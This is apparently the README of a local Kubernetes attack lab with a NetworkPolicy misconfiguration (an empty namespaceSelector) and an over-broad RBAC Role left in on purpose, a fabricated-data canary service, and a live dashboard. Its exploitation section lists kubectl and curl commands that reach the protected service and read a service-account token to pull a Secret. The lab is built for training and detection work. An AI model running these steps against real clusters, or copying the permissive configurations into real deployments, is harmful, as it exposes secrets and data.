# Kubernetes attack lab

A real local Kubernetes cluster (`kind` + Calico, so NetworkPolicy is
actually enforced), built to the shape `walmsley-lab/cyber-defense` PR #1
specified: a public app and an internal backend in separate namespaces, a
protected synthetic canary, and intentionally permissive NetworkPolicy/RBAC
variants creating an unexpected path to it.

## The two escapes

1. **NetworkPolicy (CWE-284)** — `protected`'s NetworkPolicy uses
   `namespaceSelector: {}`, which Kubernetes treats as matching *every*
   namespace, not just `internal` as intended. A pod in `public` can curl
   the canary directly.
2. **RBAC (CWE-269)** — `public-app-sa` (auto-mounted into every `public`
   pod) is bound to a Role granting `get`/`list` on Secrets in `protected`.
   Its own token reads `canary-secret` straight from the Kubernetes API —
   independent of any network path, so fixing #1 alone wouldn't close this.

Both write-ups, in the shared contract format, are in
[`../VULNERABILITY_FORMAT.md`](../VULNERABILITY_FORMAT.md). Both are also
now fixtures in a PR against `closeloop`
([manvendersingh21/closeloop#2](https://github.com/manvendersingh21/closeloop/pull/2)).

## Running it

```bash
kind create cluster --name attack-sandbox --config kind-config.yaml  # disableDefaultCNI
kubectl apply -f https://raw.githubusercontent.com/projectcalico/calico/v3.28.0/manifests/calico.yaml
./reset.sh   # applies 00-04.yaml — the clean, vulnerable starting state
```

`reset.sh` is the "get it back" script — run it between attack runs to wipe
`public`/`internal`/`protected` and reapply a clean copy. Tested, including
after real exploitation.

## Exploiting it (as Patrick would)

```bash
kubectl run nettest -n public --image=curlimages/curl --restart=Never \
  --overrides='{"spec":{"serviceAccountName":"public-app-sa"}}' --command -- sleep 3600

# NetworkPolicy escape
kubectl exec -n public nettest -- curl -s http://canary.protected.svc.cluster.local/customers

# RBAC escape
kubectl exec -n public nettest -- sh -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/protected/secrets/canary-secret
'
```

## `canary-api/`

The protected service. No app-level auth on purpose — protection is the
infra boundary, not the app. Serves 30 fabricated customer records
(`/customers`) plus a flag (`/`). Built locally and loaded straight into
`kind` with `kind load docker-image` — no registry needed.

## `dashboard/`

A Svelte + Vite spectator UI — two live views, not mocked:
- **View Environment** — `kubectl get events -A --watch`, streamed over SSE.
  Shows pod lifecycle live (confirmed working); does **not** currently show
  the exploit traffic itself (plain pod-to-pod curls and Secret reads don't
  generate Events — see the honest caveat in-repo history). Closing that
  gap needs app-level request logging in `canary-api` (catches the
  NetworkPolicy escape) and/or K8s audit logging (catches the RBAC escape).
- **Customer Data** — the real `canary-api` dataset, fetched live through a
  `kubectl port-forward`, not a static copy.

```bash
kubectl port-forward -n protected svc/canary 5678:80 &
cd dashboard && node server.js &   # API bridge, :4100
cd dashboard && npm run dev        # Vite, :5173
```
